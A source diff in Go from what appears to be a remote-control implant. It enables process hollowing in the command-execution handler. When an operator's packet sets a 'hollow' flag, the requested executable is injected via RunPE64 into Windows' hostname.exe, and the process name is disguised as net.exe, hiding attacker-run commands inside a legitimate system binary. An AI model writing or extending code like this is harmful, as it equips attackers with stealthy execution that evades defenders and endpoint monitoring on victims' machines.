@@ -14,6 +14,7 @@ import (
 	"io"
 	"os"
 	"os/exec"
+	"strings"
 	"syscall"
 	"time"
 
@@ -80,10 +81,10 @@ func ExecOutputDecode(data []byte) string {
 	}
 }
 
-func hollow(source, replace *string) {
-	log.Infof("Replacing %s with %s\n", *source, *replace)
-	data, _ := ioutil.ReadFile(*replace)
-	inject.RunPE64(data, *source, "")
+func hollow(source, replace, name string, args []string) {
+	log.Infof("Replacing %s with %s\n", source, replace)
+	data, _ := ioutil.ReadFile(replace)
+	inject.RunPE64(data, source, name, strings.Join(args, " "))
 }
 
 func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pid int, exitCode int, err error) {
@@ -92,16 +93,6 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 	pid = 0
 	exitCode = 0
 	err = nil
-
-	// Inject?
-
-	// Hollow?
-	/*shellType, ok := packetArgument["hollow"]
-	if ok {
-		source := "c:\\windows\\system32\\notepad.exe"
-		replace := "c:\\windows\\system32\\calc.exe"
-		hollow(&source, &replace)
-	}*/
 
 	processTimeout := 10 * time.Second
 	ctx, cancel := context.WithTimeout(context.Background(), processTimeout)
@@ -173,6 +164,19 @@ func Exec(packetArgument model.PacketArgument) (stdOut []byte, stdErr []byte, pi
 	}
 
 	log.Infof("Executing: %s %v", executable, args)
+
+	// Inject?
+
+	// Hollow?
+	_, ok = packetArgument["hollow"]
+	if ok {
+		source := "c:\\windows\\system32\\hostname.exe"
+		name := "net.exe"
+
+		//replace := "c:\\windows\\system32\\calc.exe"
+		hollow(source, executable, name, args)
+	}
+
 	stdOut, err = cmd.Output()
 	if err != nil {
 		if exitError, ok := err.(*exec.ExitError); ok {
